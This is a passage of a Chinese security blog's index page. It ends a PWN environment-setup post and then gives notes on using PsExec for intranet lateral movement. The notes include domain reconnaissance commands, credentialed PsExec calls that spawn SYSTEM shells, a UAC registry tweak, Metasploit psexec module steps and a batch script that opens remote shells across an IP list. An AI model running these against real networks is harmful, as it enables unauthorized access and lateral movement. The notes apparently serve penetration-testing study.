href="http://archive.canonical.com/ubuntu">http://archive.canonical.com/ubuntu</a> xenial partner<br>deb-src <a target="_blank" rel="noopener" href="http://archive.canonical.com/ubuntu">http://archive.canonical.com/ubuntu</a> xenial partner<br>deb <a target="_blank" rel="noopener" href="http://mirrors.aliyun.com/ubuntu/">http://mirrors.aliyun.com/ubuntu/</a> xenial-security main restricted<br>deb-src <a target="_blank" rel="noopener" href="http://mirrors.aliyun.com/ubuntu/">http://mirrors.aliyun.com/ubuntu/</a> xenial-security main restricted multiverse universe<br>deb <a target="_blank" rel="noopener" href="http://mirrors.aliyun.com/ubuntu/">http://mirrors.aliyun.com/ubuntu/</a> xenial-security universe<br>deb <a target="_blank" rel="noopener" href="http://mirrors.aliyun.com/ubuntu/">http://mirrors.aliyun.com/ubuntu/</a> xenial-security multiverse</p>
<pre><code>apt-get update
apt install python2 python-pip 
pip -V  =python2.7
pip install pwntools

apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
</code></pre>
<p>手把手教你PWN入门（一）——基础环境准备<br><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-259199-1.htm">https://bbs.pediy.com/thread-259199-1.htm</a><br>从零开始入门pwn(二):环境搭建<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_51466347/article/details/121851783">https://blog.csdn.net/m0_51466347/article/details/121851783</a></p>
<p>没有公钥，签名无法验证(Ubuntu18)<br>    apt-key  adv –keyserver keyserver.ubuntu.com  –recv-keys 7638D0442B90D010<br>    Executing: &#x2F;tmp&#x2F;apt-key-gpghome.KBKe2NmvPO&#x2F;gpg.1.sh –keyserver keyserver.ubuntu.com –recv-keys 7638D0442B90D010<br>    gpg: key 7638D0442B90D010: 17 signatures not checked due to missing keys<br>    gpg: 密钥 7638D0442B90D010：公钥“Debian Archive Automatic Signing Key (8&#x2F;jessie) <a href="mailto:&#x66;&#116;&#112;&#109;&#x61;&#115;&#x74;&#101;&#x72;&#64;&#100;&#x65;&#x62;&#x69;&#97;&#110;&#46;&#111;&#x72;&#x67;">&#x66;&#116;&#112;&#109;&#x61;&#115;&#x74;&#101;&#x72;&#64;&#100;&#x65;&#x62;&#x69;&#97;&#110;&#46;&#111;&#x72;&#x67;</a>”已导入<br>    gpg: 合计被处理的数量：1<br>    gpg:               已导入：1</p>

        
          <p class="article-more-link">
            <a href="/2023/01/09/PWN/#more">Read More</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/01/09/PWN/" data-id="clcrfe75l000e7gvp1tw7frr6" data-title="" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-PsExec" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/01/09/PsExec/" class="article-date">
  <time class="dt-published" datetime="2023-01-09T15:12:29.032Z" itemprop="datePublished">2023-01-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>简介<br>    PsExec 是由 Mark Russinovich 创建的 Sysinternals Suite中包含的工具。<br>    最初作为系统管理员的便利工具，以便在远程主机上运行命令来执行维护任务。后来因为太过方便，被利用到内网渗透之中。<br>    现在PsExec类的工具有各种语言的实现，如Metasploit的psexec psexec psh, Impacket psexec, pth-winexe, Empire Invoke-Psexec等等。<br>    可以获得与命令控制台几乎相同的实时交互性。<br>    PsExec最强大的功能就是在远程系统和远程支持工具（如ipconfig、whoami）中启动交互式命令提示窗口，以便显示无法通过其他方式显示的有关远程系统的信息。<br>    属于合法工具，有可以避反病毒软件和终端检测等产品</p>
<p>原理：<br>    需要远程计算机启用文件和打印共享且默认Admin$共享映射到C:windows 目录<br>    PsExec建立连接后，目标机器会安装一个 “PSEXESVC” 服务，但是PsExec退出后该服务会删除（cmd下exit 退出） </p>
<p>运行过程<br>    TCP三次握手，通过445端口SMB服务进行身份验证<br>    连接admin$默认共享，写入PSEXESVC.exe服务文件<br>    利用IPC命名管道调用svcctl服务，从而开启PSEXESVC服务<br>    生成四个命名管道以使用，1、psexesvc 2、输入管道 sdtin  3、输出管道stdout 4、重定向进程stderr</p>
<p>不足：<br>    会释放文件，易被检测溯源攻击过程<br>    安装服务，留下日志<br>    少有的情况 退出时，服务删除失败<br>    推荐使用wmiexec</p>
<p>定位域控<br>    net view &#x2F;domain 查看域<br>    net view &#x2F;domain:test 域内主机<br>    ping dc<br>    nslookup dc<br>查看当前登录域<br>    net config workstation<br>查看当前域的密码策略<br>    net accounts &#x2F;domain<br>查看补丁信息<br>    wmic qfe<br>查看当前系统信息<br>    wmic os</p>
<p>无ipc连接时，我们需要进行身份验证<br>    PsExec.exe \192.168.1.1 -u administrtor -p 123456 cmd.exe		远程启用账户权限的cmd<br>    PsExec.exe \192.168.1.1 -u administrtor -p 123456  -s cmd.exe  远程启用System权限的cmd，需要administrator权限的shell<br>    PsExec.exe \192.168.1.1 -u administrtor -p 123456 cmd &#x2F;c “ipconfig”		远程启用cmd执行ipconfig并回显 </p>
<p>PsExec参数<br>    # -accepteula  第一次运行 PsExec 会弹出确认框，使用该参数就不会弹出确认框<br>    # -s      以System权限运行远程进程，获得一个System权限的交互式Shell，如果不用这个参数，那么会获得一个administrator权限的shell<br>    # -h 如果可以，以管理员权限运行远程进程<br>    # -d 不等待程序执行完就返回，请只对非交互式应用程序使用此选项<br>UAC认证弹窗<br>    HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionPoliciesSystem添加新DWORD值，键值：LocalAccountTokenFilterPolicy 为1<br>    修改注册表容易引起告警，一般不建议</p>
<p>有ipc连接时<br>    net use \192.168.1.1\ipc$  &#x2F;user:”administrator” “123456”<br>    PsExec.exe \192.168.1.1 cmd.exe		远程启用cmd</p>
<p>MSF IPC利用<br>    search psexec<br>    exploit&#x2F;windows&#x2F;smb&#x2F;psexec<br>    exploit&#x2F;windows&#x2F;smb&#x2F;psexec_psh（Powershell 版本的 psexec,是 powershell 版本的payload）<br>    use exploit&#x2F;windows&#x2F;smb&#x2F;psexec<br>    set RHOST 192.168.1.1<br>    set smbuser usernmae<br>    set smbpass password<br>    run</p>
<p>批量<br>@echo off<br>echo check ip addr config file…<br>if not exist ip.txt echo ip addr config file ip.txt does not exist! &amp; goto end<br>echo read and analysis file…<br>for &#x2F;F “eol&#x3D;#” %%i in (ip.txt) do start PsExec.exe \%%i -accepteula -u administrator -p “123456” cmd &amp; start cmd &#x2F;c PsExec.exe \%%i -u administrator -p “123456” cmd<br>:end<br>exit</p>
        
          <p class="article-more-link">
            <a href="/2023/01/09/PsExec/#more">Read More</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/01/09/PsExec/" data-id="clcrfe75o000j7gvp0n5mh5mf" data-title="" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/">&laquo; 上一页</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/3/">下一页 &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">分类</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/AV/">AV</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Domain/">Domain</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/IPC/">IPC</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Intranet/">Intranet</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Intranet/IPC/">IPC</a></li></ul></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/AV/" rel="tag">AV</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Domain/" rel="tag">Domain</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签云</h3>
    <div class="widget tagcloud">
      <a href="/tags/AV/" style="font-size: 10px;">AV</a> <a href="/tags/Domain/" style="font-size: 10px;">Domain</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">归档</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">一月 2023</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">最新文章</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/adminbook">Adminbook</a>
          </li>
        
          <li>
            <a href="/MS17-010">MS17-010</a>
          </li>
        
          <li>
            <a href="/2023/01/09/%E5%BC%BA%E8%A1%8C%E6%94%B9%E5%BC%80%E6%9C%BA%E5%AF%86%E7%A0%81/">(no title)</a>
          </li>
        
          <li>
            <a href="/2023/01/09/zzcms%E6%BC%8F%E6%B4%9E/">(no title)</a>
          </li>
        
          <li>
            <a href="/2023/01/09/zzcms%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">(no title)</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2023 两袖空空<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>